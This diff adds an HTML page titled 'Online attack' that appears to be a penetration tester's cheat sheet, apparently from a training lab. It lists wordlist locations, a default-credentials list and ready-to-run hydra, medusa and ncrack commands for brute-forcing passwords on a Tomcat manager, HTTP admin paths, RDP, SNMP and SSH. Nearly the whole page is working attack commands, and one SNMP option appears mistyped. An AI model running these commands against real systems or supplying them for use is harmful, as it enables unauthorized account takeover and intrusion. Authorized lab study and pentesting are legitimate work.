@@ -1,0 +1,27 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Online attack</title>
+</head><body><span style="color: #ff0000">List<br/>
+</span>/usr/share/metasploit-framework/data/wordlists/<br/>
+/usr/share/wordlists/<span style="color: #ff0000"><br/>
+</span><span style="color: #ff0000"><br/>
+Default Credentials<br/>
+</span><span style="color: #bfbfbf">https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials</span><span style="color: #ff0000"><br/>
+</span><span style="color: #ff0000"><br/>
+HTTP Basic Auth<br/>
+</span>hydra -L /home/mrtouch/Documents/Fuzzer/Wordlist-User-Pwd/Passwords/rockyou.txt -P /home/mrtouch/Documents/Fuzzer/Wordlist-User-Pwd/Passwords/rockyou.txt -f 10.13.200.118 -s 8080 -m /manager/html http-get &nbsp;-V<span style="color: #ff0000"><br/>
+</span><span style="color: #ff0000"><br/>
+</span><span style="color: #ff0000">HTTP Brute Force:</span><br/>
+medusa -h 10.13.11.19 -u admin -P password-file.txt -M http -m DIR:/admin -T 10<br/>
+<br/>
+<span style="color: #ff0000">RDP Brute Force:</span><br/>
+ncrack -vv --user offsec -P password-file.txt rdp://10.13.1.35<span style="font-size: 14pt"><br/>
+</span>hydra -L user.txt -P password.txt &nbsp;rdp://10.13.1.35<br/>
+<br/>
+<span style="color: #ff0000">SNMP Brute Force:</span><br/>
+hydra -P password-file.txt -1 10.13.1.219 snmp<br/>
+<br/>
+<span style="color: #ff0000">SSH Brute Force:</span><br/>
+hydra -L /tmp/users.txt -P /tmp/users.txt 10.13.1.110 ssh</body></html>
